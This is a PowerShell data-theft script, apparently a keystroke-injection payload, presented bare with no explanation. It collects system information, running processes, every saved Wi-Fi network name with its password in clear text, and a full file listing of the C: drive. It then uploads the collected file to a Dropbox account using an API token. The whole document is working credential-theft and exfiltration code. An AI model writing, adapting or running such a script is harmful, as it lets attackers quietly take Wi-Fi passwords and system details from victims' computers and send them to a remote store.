$dropboxToken = "your-token-here"
$outputFile = "$env:temp\systeminfo.txt"

REM Collect system information

systeminfo > $outputFile
Add-Content -Path $outputFile -Value "`n===== Running Processes =====`n"
Get-Process | Out-File -FilePath $outputFile -Append

REM Collect SSID and Wi-Fi passwords

Add-Content -Path $outputFile -Value "`n===== Wi-Fi SSIDs and Passwords =====`n"
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}
foreach ($profile in $wifiProfiles) {
    $wifiDetails = netsh wlan show profile name="$profile" key=clear | Select-String "(?:SSID|Key Content).*?:.*"
    Add-Content -Path $outputFile -Value "`nProfile: $profile`n$wifiDetails`n"
}

REM Creating Tree List

Add-Content -Path $outputFile -Value "`n===== File Tree of C:\ =====`n"
Get-ChildItem -Path "C:\" -Recurse -Force | ForEach-Object {
    $_.FullName
} | Out-File -FilePath $outputFile -Append

REM Upload to Dropbox 

Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
    -Headers @{
        "Authorization" = "Bearer $dropboxToken";
        "Dropbox-API-Arg" = '{"path": "/systeminfo.txt", "mode": "overwrite"}';
        "Content-Type" = "application/octet-stream"
    } `
    -Method Post -InFile $outputFile
